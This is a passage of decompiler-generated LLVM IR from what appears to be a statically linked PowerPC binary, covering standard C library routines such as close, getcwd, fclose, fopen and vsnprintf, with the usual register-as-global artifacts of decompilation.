define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10002bc4 = call i32 @__asm_mfcr()
  %v1_10002bc8 = and i32 %v0_10002bc4, 268435456
  %v3_10002bc8 = icmp eq i32 %v1_10002bc8, 0
  store i32 %v0_10002bc4, i32* %r31.global-to-local, align 4
  br i1 %v3_10002bc8, label %dec_label_pc_10002be0, label %dec_label_pc_10002bd4

dec_label_pc_10002bd4:                            ; preds = %entry
  %v0_10002bd4 = call i32 @__errno_location()
  %v0_10002bd8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002bd8 = inttoptr i32 %v0_10002bd4 to i32*
  store i32 %v0_10002bd8, i32* %v2_10002bd8, align 4
  br label %dec_label_pc_10002be0

dec_label_pc_10002be0:                            ; preds = %entry, %dec_label_pc_10002bd4
  %v0_10002bf0 = phi i32 [ %v0_10002bc4, %entry ], [ -1, %dec_label_pc_10002bd4 ]
  ret i32 %v0_10002bf0

; uselistorder directives
  uselistorder label %dec_label_pc_10002be0, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10002c0c = call i32 @__asm_mfcr()
  %v1_10002c10 = and i32 %v0_10002c0c, 268435456
  %v3_10002c10 = icmp eq i32 %v1_10002c10, 0
  store i32 %v0_10002c0c, i32* %r31.global-to-local, align 4
  br i1 %v3_10002c10, label %dec_label_pc_10002c28, label %dec_label_pc_10002c1c

dec_label_pc_10002c1c:                            ; preds = %entry
  %v0_10002c1c = call i32 @__errno_location()
  %v0_10002c20 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002c20 = inttoptr i32 %v0_10002c1c to i32*
  store i32 %v0_10002c20, i32* %v2_10002c20, align 4
  br label %dec_label_pc_10002c28

dec_label_pc_10002c28:                            ; preds = %entry, %dec_label_pc_10002c1c
  %v0_10002c38 = phi i32 [ %v0_10002c0c, %entry ], [ -1, %dec_label_pc_10002c1c ]
  ret i32 %v0_10002c38

; uselistorder directives
  uselistorder label %dec_label_pc_10002c28, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v3_10002c48 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r30, align 4
  %v3_10002c58 = icmp eq i32 %arg1, 0
  br i1 %v3_10002c48, label %dec_label_pc_10002c58, label %dec_label_pc_10002c8c

dec_label_pc_10002c58:                            ; preds = %entry
  br i1 %v3_10002c58, label %dec_label_pc_10002c74, label %dec_label_pc_10002c60

dec_label_pc_10002c60:                            ; preds = %dec_label_pc_10002c58
  %v0_10002c60 = call i32 @__errno_location()
  store i32 0, i32* @r30, align 4
  %v2_10002c6c = inttoptr i32 %v0_10002c60 to i32*
  store i32 22, i32* %v2_10002c6c, align 4
  br label %dec_label_pc_10002d24

dec_label_pc_10002c74:                            ; preds = %dec_label_pc_10002c58
  store i32 268446840, i32* @lr, align 4
  %v0_10002c74 = call i32 @__GI_getpagesize()
  %v1_10002c78 = icmp slt i32 %v0_10002c74, 4096
  %v0_10002c7c. = select i1 %v1_10002c78, i32 4096, i32 %v0_10002c74
  store i32 %v0_10002c7c., i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10002c9c

dec_label_pc_10002c8c:                            ; preds = %entry
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  br i1 %v3_10002c58, label %dec_label_pc_10002c9c, label %dec_label_pc_10002cac

dec_label_pc_10002c9c:                            ; preds = %dec_label_pc_10002c74, %dec_label_pc_10002c8c
  %v0_10002c9c = phi i32 [ %v0_10002c7c., %dec_label_pc_10002c74 ], [ %arg2, %dec_label_pc_10002c8c ]
  store i32 %v0_10002c9c, i32* @r3, align 4
  store i32 268446884, i32* @lr, align 4
  %v0_10002ca0 = call i32 @malloc()
  store i32 %v0_10002ca0, i32* @r29, align 4
  %v3_10002ca4 = icmp eq i32 %v0_10002ca0, 0
  br i1 %v3_10002ca4, label %dec_label_pc_10002d20, label %dec_label_pc_10002c9c.dec_label_pc_10002cac_crit_edge

dec_label_pc_10002c9c.dec_label_pc_10002cac_crit_edge: ; preds = %dec_label_pc_10002c9c
  br label %dec_label_pc_10002cac

dec_label_pc_10002cac:                            ; preds = %dec_label_pc_10002c9c.dec_label_pc_10002cac_crit_edge, %dec_label_pc_10002c8c
  %v0_10002cbc = call i32 @__asm_mfcr()
  %v1_10002cc0 = and i32 %v0_10002cbc, 268435456
  %v3_10002cc0 = icmp eq i32 %v1_10002cc0, 0
  store i32 %v0_10002cbc, i32* %r31.global-to-local, align 4
  store i32 %v0_10002cbc, i32* @r4, align 4
  br i1 %v3_10002cc0, label %dec_label_pc_10002cdc, label %dec_label_pc_10002cd0

dec_label_pc_10002cd0:                            ; preds = %dec_label_pc_10002cac
  %v0_10002cd0 = call i32 @__errno_location()
  store i32 -1, i32* @r4, align 4
  %v0_10002cd8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002cd8 = inttoptr i32 %v0_10002cd0 to i32*
  store i32 %v0_10002cd8, i32* %v2_10002cd8, align 4
  %v0_10002cdc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10002cdc

dec_label_pc_10002cdc:                            ; preds = %dec_label_pc_10002cac, %dec_label_pc_10002cd0
  %v0_10002cdc = phi i32 [ %v0_10002cbc, %dec_label_pc_10002cac ], [ %v0_10002cdc.pre, %dec_label_pc_10002cd0 ]
  %v1_10002cdc = icmp slt i32 %v0_10002cdc, 0
  %v0_10002ce0 = load i32, i32* @r30, align 4
  %v3_10002ce0 = icmp eq i32 %v0_10002ce0, 0
  br i1 %v1_10002cdc, label %dec_label_pc_10002d10, label %dec_label_pc_10002ce8

dec_label_pc_10002ce8:                            ; preds = %dec_label_pc_10002cdc
  br i1 %v3_10002ce0, label %dec_label_pc_10002cec, label %dec_label_pc_10002d00.thread8

dec_label_pc_10002d00.thread8:                    ; preds = %dec_label_pc_10002ce8
  br label %dec_label_pc_10002d24

dec_label_pc_10002cec:                            ; preds = %dec_label_pc_10002ce8
  %v0_10002cec = load i32, i32* @r28, align 4
  %v3_10002cec = icmp eq i32 %v0_10002cec, 0
  br i1 %v3_10002cec, label %dec_label_pc_10002d00, label %dec_label_pc_10002d00.thread

dec_label_pc_10002d00.thread:                     ; preds = %dec_label_pc_10002cec
  br label %dec_label_pc_10002d08

dec_label_pc_10002d00:                            ; preds = %dec_label_pc_10002cec
  %v0_10002cf4 = load i32, i32* @r29, align 4
  store i32 268446972, i32* @lr, align 4
  %v1_10002cf8 = call i32 @realloc(i32 %v0_10002cf4)
  store i32 %v1_10002cf8, i32* @r30, align 4
  %v3_10002d00 = icmp eq i32 %v1_10002cf8, 0
  br i1 %v3_10002d00, label %dec_label_pc_10002d08, label %dec_label_pc_10002d24

dec_label_pc_10002d08:                            ; preds = %dec_label_pc_10002d00.thread, %dec_label_pc_10002d00
  %v0_10002d08 = load i32, i32* @r29, align 4
  store i32 %v0_10002d08, i32* @r30, align 4
  br label %dec_label_pc_10002d24

dec_label_pc_10002d10:                            ; preds = %dec_label_pc_10002cdc
  br i1 %v3_10002ce0, label %dec_label_pc_10002d14, label %dec_label_pc_10002d20

dec_label_pc_10002d14:                            ; preds = %dec_label_pc_10002d10
  %v0_10002d14 = load i32, i32* @r29, align 4
  store i32 %v0_10002d14, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10002d1c.339 to i32), i32* @lr, align 4
  %v0_10002d18 = call i32 @free()
  br label %dec_label_pc_10002d24

dec_label_pc_10002d20:                            ; preds = %dec_label_pc_10002d10, %dec_label_pc_10002c9c
  store i32 0, i32* @r30, align 4
  br label %dec_label_pc_10002d24

dec_label_pc_10002d24:                            ; preds = %dec_label_pc_10002d00.thread8, %dec_label_pc_10002d00, %dec_label_pc_10002d14, %dec_label_pc_10002d08, %dec_label_pc_10002c60, %dec_label_pc_10002d20
  %v0_10002d28 = load i32, i32* @r30, align 4
  ret i32 %v0_10002d28

; uselistorder directives
  uselistorder i32 %v0_10002cbc, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10002d24, { 5, 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_10002d08, { 1, 0 }
  uselistorder label %dec_label_pc_10002cdc, { 1, 0 }
  uselistorder label %dec_label_pc_10002c9c, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v3_10002d44 = load i32, i32* @global_var_1001d87c.340, align 4
  %v3_10002d48 = icmp eq i32 %v3_10002d44, 0
  %v0_10002d4c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10002d48, i32 %v0_10002d4c)
  ret i32 %v3_10002d44
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10002d70 = call i32 @__asm_mfcr()
  %v1_10002d74 = and i32 %v0_10002d70, 268435456
  %v3_10002d74 = icmp eq i32 %v1_10002d74, 0
  store i32 %v0_10002d70, i32* %r31.global-to-local, align 4
  br i1 %v3_10002d74, label %dec_label_pc_10002d8c, label %dec_label_pc_10002d80

dec_label_pc_10002d80:                            ; preds = %entry
  %v0_10002d80 = call i32 @__errno_location()
  %v0_10002d84 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002d84 = inttoptr i32 %v0_10002d80 to i32*
  store i32 %v0_10002d84, i32* %v2_10002d84, align 4
  br label %dec_label_pc_10002d8c

dec_label_pc_10002d8c:                            ; preds = %entry, %dec_label_pc_10002d80
  %v0_10002d9c = phi i32 [ %v0_10002d70, %entry ], [ -1, %dec_label_pc_10002d80 ]
  ret i32 %v0_10002d9c

; uselistorder directives
  uselistorder label %dec_label_pc_10002d8c, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10002db8 = call i32 @__asm_mfcr()
  %v1_10002dbc = and i32 %v0_10002db8, 268435456
  %v3_10002dbc = icmp eq i32 %v1_10002dbc, 0
  store i32 %v0_10002db8, i32* %r31.global-to-local, align 4
  br i1 %v3_10002dbc, label %dec_label_pc_10002dd4, label %dec_label_pc_10002dc8

dec_label_pc_10002dc8:                            ; preds = %entry
  %v0_10002dc8 = call i32 @__errno_location()
  %v0_10002dcc = load i32, i32* %r31.global-to-local, align 4
  %v2_10002dcc = inttoptr i32 %v0_10002dc8 to i32*
  store i32 %v0_10002dcc, i32* %v2_10002dcc, align 4
  br label %dec_label_pc_10002dd4

dec_label_pc_10002dd4:                            ; preds = %entry, %dec_label_pc_10002dc8
  %v0_10002de4 = phi i32 [ %v0_10002db8, %entry ], [ -1, %dec_label_pc_10002dc8 ]
  ret i32 %v0_10002de4

; uselistorder directives
  uselistorder label %dec_label_pc_10002dd4, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10002e00 = call i32 @__asm_mfcr()
  %v1_10002e04 = and i32 %v0_10002e00, 268435456
  %v3_10002e04 = icmp eq i32 %v1_10002e04, 0
  store i32 %v0_10002e00, i32* %r31.global-to-local, align 4
  br i1 %v3_10002e04, label %dec_label_pc_10002e1c, label %dec_label_pc_10002e10

dec_label_pc_10002e10:                            ; preds = %entry
  %v0_10002e10 = call i32 @__errno_location()
  %v0_10002e14 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002e14 = inttoptr i32 %v0_10002e10 to i32*
  store i32 %v0_10002e14, i32* %v2_10002e14, align 4
  br label %dec_label_pc_10002e1c

dec_label_pc_10002e1c:                            ; preds = %entry, %dec_label_pc_10002e10
  %v0_10002e2c = phi i32 [ %v0_10002e00, %entry ], [ -1, %dec_label_pc_10002e10 ]
  ret i32 %v0_10002e2c

; uselistorder directives
  uselistorder label %dec_label_pc_10002e1c, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10002e48 = call i32 @__asm_mfcr()
  %v1_10002e4c = and i32 %v0_10002e48, 268435456
  %v3_10002e4c = icmp eq i32 %v1_10002e4c, 0
  store i32 %v0_10002e48, i32* %r31.global-to-local, align 4
  br i1 %v3_10002e4c, label %dec_label_pc_10002e64, label %dec_label_pc_10002e58

dec_label_pc_10002e58:                            ; preds = %entry
  %v0_10002e58 = call i32 @__errno_location()
  %v0_10002e5c = load i32, i32* %r31.global-to-local, align 4
  %v2_10002e5c = inttoptr i32 %v0_10002e58 to i32*
  store i32 %v0_10002e5c, i32* %v2_10002e5c, align 4
  br label %dec_label_pc_10002e64

dec_label_pc_10002e64:                            ; preds = %entry, %dec_label_pc_10002e58
  %v0_10002e74 = phi i32 [ %v0_10002e48, %entry ], [ -1, %dec_label_pc_10002e58 ]
  ret i32 %v0_10002e74

; uselistorder directives
  uselistorder label %dec_label_pc_10002e64, { 1, 0 }
}

define i32 @__GI_time(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10002e90 = call i32 @__asm_mfcr()
  %v1_10002e94 = and i32 %v0_10002e90, 268435456
  %v3_10002e94 = icmp eq i32 %v1_10002e94, 0
  store i32 %v0_10002e90, i32* %r31.global-to-local, align 4
  br i1 %v3_10002e94, label %dec_label_pc_10002eac, label %dec_label_pc_10002ea0

dec_label_pc_10002ea0:                            ; preds = %entry
  %v0_10002ea0 = call i32 @__errno_location()
  %v0_10002ea4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002ea4 = inttoptr i32 %v0_10002ea0 to i32*
  store i32 %v0_10002ea4, i32* %v2_10002ea4, align 4
  br label %dec_label_pc_10002eac

dec_label_pc_10002eac:                            ; preds = %entry, %dec_label_pc_10002ea0
  %v0_10002ebc = phi i32 [ %v0_10002e90, %entry ], [ -1, %dec_label_pc_10002ea0 ]
  ret i32 %v0_10002ebc

; uselistorder directives
  uselistorder label %dec_label_pc_10002eac, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_10002ec4 = call i32 @wait4(i32 0)
  ret i32 %v1_10002ec4
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10002ee0 = call i32 @__asm_mfcr()
  %v1_10002ee4 = and i32 %v0_10002ee0, 268435456
  %v3_10002ee4 = icmp eq i32 %v1_10002ee4, 0
  store i32 %v0_10002ee0, i32* %r31.global-to-local, align 4
  br i1 %v3_10002ee4, label %dec_label_pc_10002efc, label %dec_label_pc_10002ef0

dec_label_pc_10002ef0:                            ; preds = %entry
  %v0_10002ef0 = call i32 @__errno_location()
  %v0_10002ef4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002ef4 = inttoptr i32 %v0_10002ef0 to i32*
  store i32 %v0_10002ef4, i32* %v2_10002ef4, align 4
  br label %dec_label_pc_10002efc

dec_label_pc_10002efc:                            ; preds = %entry, %dec_label_pc_10002ef0
  %v0_10002f0c = phi i32 [ %v0_10002ee0, %entry ], [ -1, %dec_label_pc_10002ef0 ]
  ret i32 %v0_10002f0c

; uselistorder directives
  uselistorder label %dec_label_pc_10002efc, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10002f10 = add i32 %arg1, 128
  %v1_10002f14 = mul i32 %arg1, 2
  %v2_10002f18 = icmp ugt i32 %v1_10002f10, 383
  %v0_10002f1c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10002f18, i32 %v0_10002f1c)
  %v3_10002f24 = load i32, i32* inttoptr (i32 268556268 to i32*), align 4
  %v2_10002f28 = add i32 %v1_10002f14, %v3_10002f24
  %v3_10002f28 = inttoptr i32 %v2_10002f28 to i16*
  %v4_10002f28 = load i16, i16* %v3_10002f28, align 2
  %v5_10002f28 = sext i16 %v4_10002f28 to i32
  ret i32 %v5_10002f28
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1001d88c.341 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10002f50 = add i32 %tmp, 52
  %v3_10002f50 = inttoptr i32 %v2_10002f50 to i32*
  %v4_10002f50 = load i32, i32* %v3_10002f50, align 4
  store i32 %v4_10002f50, i32* @r28, align 4
  %v3_10002f54 = icmp eq i32 %v4_10002f50, 0
  store i1 %v3_10002f54, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10002f54, label %dec_label_pc_10002f5c, label %dec_label_pc_10002f7c

dec_label_pc_10002f5c:                            ; preds = %entry
  %v2_10002f64 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10002f64, i32* @r3, align 4
  %v0_10002f70 = call i32 @__pthread_return_void()
  %v0_10002f78 = call i32 @__pthread_return_0()
  %v0_10002f7c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10002f7c

dec_label_pc_10002f7c:                            ; preds = %entry, %dec_label_pc_10002f5c
  %v0_10002f8c = phi i32 [ %tmp, %entry ], [ %v0_10002f7c.pre, %dec_label_pc_10002f5c ]
  %v1_10002f7c = inttoptr i32 %v0_10002f8c to i16*
  %v2_10002f7c = load i16, i16* %v1_10002f7c, align 2
  %v3_10002f7c = zext i16 %v2_10002f7c to i32
  store i32 0, i32* @r27, align 4
  %v1_10002f84 = and i32 %v3_10002f7c, 64
  %v3_10002f84 = icmp eq i32 %v1_10002f84, 0
  br i1 %v3_10002f84, label %dec_label_pc_10002f98, label %dec_label_pc_10002f8c

dec_label_pc_10002f8c:                            ; preds = %dec_label_pc_10002f7c
  store i32 268447636, i32* @lr, align 4
  %v4_10002f90 = call i32 @fflush_unlocked(i16* %v1_10002f7c, i32 %v1_10002f84)
  store i32 %v4_10002f90, i32* @r27, align 4
  %v0_10002f98.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10002f98

dec_label_pc_10002f98:                            ; preds = %dec_label_pc_10002f7c, %dec_label_pc_10002f8c
  %v0_10002f98 = phi i32 [ %v0_10002f8c, %dec_label_pc_10002f7c ], [ %v0_10002f98.pre, %dec_label_pc_10002f8c ]
  %v1_10002f98 = add i32 %v0_10002f98, 4
  %v2_10002f98 = inttoptr i32 %v1_10002f98 to i32*
  %v3_10002f98 = load i32, i32* %v2_10002f98, align 4
  store i32 268447648, i32* @lr, align 4
  %v1_10002f9c = call i32 @__libc_close(i32 %v3_10002f98)
  %v3_10002fa0 = icmp eq i32 %v1_10002f9c, 0
  store i1 %v3_10002fa0, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_10002f9c, -1
  br i1 %tmp8, label %dec_label_pc_10002fac, label %dec_label_pc_10002fa8

dec_label_pc_10002fa8:                            ; preds = %dec_label_pc_10002f98
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10002fac

dec_label_pc_10002fac:                            ; preds = %dec_label_pc_10002f98, %dec_label_pc_10002fa8
  %v1_10002fb4 = load i32, i32* @r31, align 4
  %v2_10002fb4 = add i32 %v1_10002fb4, 4
  %v3_10002fb4 = inttoptr i32 %v2_10002fb4 to i32*
  store i32 -1, i32* %v3_10002fb4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006d24.342 to i32), i32* @r26, align 4
  %v2_10002fc0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10002fc0, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_1001d4c4.343 to i32), i32* @r29, align 4
  store i32 %v2_10002fc0, i32* @r3, align 4
  %v0_10002fd4 = call i32 @__pthread_return_void()
  %v0_10002fdc = call i32 @__pthread_return_0()
  %v3_10002fe4 = load i32, i32* @global_var_1001d864.344, align 4
  store i32 %v2_10002fc0, i32* @r3, align 4
  %v1_10002ff0 = add i32 %v3_10002fe4, 1
  store i32 %v1_10002ff0, i32* @global_var_1001d864.344, align 4
  %v0_10002ff8 = call i32 @__pthread_return_void()
  %v0_10002ffc = load i32, i32* @r31, align 4
  %v1_10002ffc = inttoptr i32 %v0_10002ffc to i16*
  %v2_10002ffc = load i16, i16* %v1_10002ffc, align 2
  %v3_10002ffc = zext i16 %v2_10002ffc to i32
  %v0_10003000 = load i32, i32* @r28, align 4
  %v3_10003000 = icmp eq i32 %v0_10003000, 0
  store i1 %v3_10003000, i1* %cr7_eq.global-to-local, align 1
  %v1_10003004 = call i32 @__asm_rlwinm(i32 %v3_10002ffc, i32 0, i32 17, i32 18)
  %v1_1000300c = or i32 %v1_10003004, 48
  %v1_10003010 = trunc i32 %v1_1000300c to i16
  %v2_10003010 = load i32, i32* @r31, align 4
  %v3_10003010 = inttoptr i32 %v2_10003010 to i16*
  store i16 %v1_10003010, i16* %v3_10003010, align 2
  %v0_10003014 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10003014, label %dec_label_pc_10003018, label %dec_label_pc_10003024

dec_label_pc_10003018:                            ; preds = %dec_label_pc_10002fac
  %v2_10003018 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10003018, i32* @r3, align 4
  %v0_10003020 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10003024

dec_label_pc_10003024:                            ; preds = %dec_label_pc_10002fac, %dec_label_pc_10003018
  %v0_10003024 = load i32, i32* @r31, align 4
  %v1_10003024 = inttoptr i32 %v0_10003024 to i16*
  %v2_10003024 = load i16, i16* %v1_10003024, align 2
  %v1_10003028 = and i16 %v2_10003024, 16384
  %v3_10003028 = icmp eq i16 %v1_10003028, 0
  br i1 %v3_10003028, label %dec_label_pc_10003038, label %dec_label_pc_10003030

dec_label_pc_10003030:                            ; preds = %dec_label_pc_10003024
  %v1_10003030 = add i32 %v0_10003024, 8
  %v2_10003030 = inttoptr i32 %v1_10003030 to i32*
  %v3_10003030 = load i32, i32* %v2_10003030, align 4
  store i32 %v3_10003030, i32* @r3, align 4
  store i32 268447800, i32* @lr, align 4
  %v0_10003034 = call i32 @free()
  br label %dec_label_pc_10003038

dec_label_pc_10003038:                            ; preds = %dec_label_pc_10003024, %dec_label_pc_10003030
  store i32 %v2_10002fc0, i32* @r3, align 4
  %v0_10003044 = call i32 @__pthread_return_void()
  %v0_1000304c = call i32 @__pthread_return_0()
  %v3_10003054 = load i32, i32* @global_var_1001d868.345, align 4
  store i32 %v2_10002fc0, i32* @r3, align 4
  %v1_10003060 = add i32 %v3_10003054, 1
  store i32 %v1_10003060, i32* @global_var_1001d868.345, align 4
  %v0_10003068 = call i32 @__pthread_return_void()
  store i32 268447856, i32* @lr, align 4
  %v0_1000306c = call i32 @_stdio_openlist_dec_use()
  %v0_10003074 = load i32, i32* @r27, align 4
  ret i32 %v0_10003074

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10003038, { 1, 0 }
  uselistorder label %dec_label_pc_10003024, { 1, 0 }
  uselistorder label %dec_label_pc_10002fac, { 1, 0 }
  uselistorder label %dec_label_pc_10002f98, { 1, 0 }
  uselistorder label %dec_label_pc_10002f7c, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_10003090 = call i32 @_stdio_fopen(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_10003090
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 -1, i32* @r4, align 4
  %v0_100030a0 = call i32 @__GI_vsnprintf()
  ret i32 %v0_100030a0
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r7, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_100030c4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_100030c4, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_10003114 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10003114, i32* %stack_var_-96, align 4
  store i32 268448032, i32* @lr, align 4
  %v0_1000311c = call i32 @__GI_vsnprintf()
  ret i32 %v0_1000311c
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_10003154 = load i32, i32* @r4, align 4
  store i32 %v0_10003154, i32* @r27, align 4
  %v0_10003158 = load i32, i32* @r3, align 4
  %v1_10003158 = sub i32 -1, %v0_10003158
  store i32 %v1_10003158, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_10003158, i32* %r31.global-to-local, align 4
  %v2_1000316c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000316c, i32* @r3, align 4
  %v0_10003170 = load i32, i32* @r5, align 4
  store i32 %v0_10003170, i32* %r29.global-to-local, align 4
  %v0_10003174 = load i32, i32* @r6, align 4
  store i32 %v0_10003174, i32* @r28, align 4
  store i32 268448132, i32* @lr, align 4
  %v0_10003180 = call i32 @__stdio_init_mutex()
  %v0_10003184 = load i32, i32* %r30.global-to-local, align 4
  %v1_10003184 = load i32, i32* @r27, align 4
  %v3_10003184 = icmp ugt i32 %v0_10003184, %v1_10003184
  %v0_10003188 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10003188, i32* @r4, align 4
  %v0_1000318c = load i32, i32* @r28, align 4
  store i32 %v0_1000318c, i32* @r5, align 4
  %v2_10003190 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10003190, i32* @r3, align 4
  br i1 %v3_10003184, label %dec_label_pc_1000319c, label %dec_label_pc_100031a0

dec_label_pc_1000319c:                            ; preds = %entry
  store i32 %v1_10003184, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100031a0

dec_label_pc_100031a0:                            ; preds = %entry, %dec_label_pc_1000319c
  %v1_100031a0 = phi i32 [ %v0_10003184, %entry ], [ %v1_10003184, %dec_label_pc_1000319c ]
  %v0_100031a0 = load i32, i32* %r31.global-to-local, align 4
  store i32 268448192, i32* @lr, align 4
  %v0_100031bc = call i32 @_vfprintf_internal()
  %v0_100031c0 = load i32, i32* @r30, align 4
  %v3_100031c0 = icmp eq i32 %v0_100031c0, 0
  br i1 %v3_100031c0, label %dec_label_pc_100031e8, label %dec_label_pc_100031c8

dec_label_pc_100031c8:                            ; preds = %dec_label_pc_100031a0
  %v4_100031d4 = icmp eq i32 %v1_100031a0, 0
  %v1_100031d0 = sext i1 %v4_100031d4 to i32
  %v0_100031dc.v0_100031a0 = add i32 %v0_100031a0, %v1_100031d0
  %stack_var_-88.0 = inttoptr i32 %v0_100031dc.v0_100031a0 to i8*
  %v0_100031e4 = load i32, i32* @r26, align 4
  %v1_100031e4 = trunc i32 %v0_100031e4 to i8
  store i8 %v1_100031e4, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_100031e8

dec_label_pc_100031e8:                            ; preds = %dec_label_pc_100031a0, %dec_label_pc_100031c8
  ret i32 %v0_100031bc

; uselistorder directives
  uselistorder i32 %v0_10003158, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder label %dec_label_pc_100031e8, { 1, 0 }
  uselistorder label %dec_label_pc_100031a0, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10003200 = load i32, i32* @lr, align 4
  store i32 %v0_10003200, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_10003210 = load i32, i32* @r5, align 4
  store i32 %v0_10003210, i32* @r31, align 4
  %v0_10003214 = load i32, i32* @r6, align 4
  store i32 %v0_10003214, i32* @r29, align 4
  %v3_10003218 = load i8, i8* %arg2, align 1
  %v4_10003218 = zext i8 %v3_10003218 to i32
  store i32 %v4_10003218, i32* %r0.global-to-local, align 4
  %v3_1000321c = icmp eq i8 %v3_10003218, 114
  br i1 %v3_1000321c, label %dec_label_pc_10003268, label %dec_label_pc_10003224

dec_label_pc_10003224:                            ; preds = %entry
  %v3_10003224 = icmp eq i8 %v3_10003218, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_10003224, label %dec_label_pc_1000326c, label %dec_label_pc_10003230

dec_label_pc_10003230:                            ; preds = %dec_label_pc_10003224
  %v3_10003230 = icmp eq i8 %v3_10003218, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_10003230, label %dec_label_pc_1000326c, label %dec_label_pc_1000323c

